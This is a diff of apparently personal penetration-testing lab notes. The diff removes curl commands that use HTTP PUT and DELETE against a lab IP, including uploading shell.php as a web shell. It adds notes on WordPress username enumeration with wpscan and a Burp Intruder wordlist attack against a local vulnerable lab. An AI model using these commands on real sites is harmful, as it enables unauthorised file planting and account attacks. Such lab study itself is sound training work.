@@ -1,16 +1,23 @@
-HTTP METHODS
-GET
-POST
-OPTIONS
-DELETE
-PUT
 
-Display all methods permitted on a website 
-curl -v -X OPTIONS http://10.10.10.6/ve
+Username enumeration
+error based testing
+guess username
+automated enumeration
+wordlist attack
 
-curl -X DELETE http://10.10.10.6/1.txt
+bash pentestlab.sh --help
+pentestlab.sh list
+./pentestlab.sh start vulnerablewordpress
+pentestlab.sh status
+usernames
+testsite-1a
+test1
 
-curl -X PUT -d 'hacked 'http://10.10.10.6/shell.txt
+guess username just guess
 
-curl -X PUT --upload-file shell.php http://10.10.10.6/shell.php
+wpscan -url http:// -e u 
+
+wordlist attack
+Used burpsuite intruder to attack
+
 
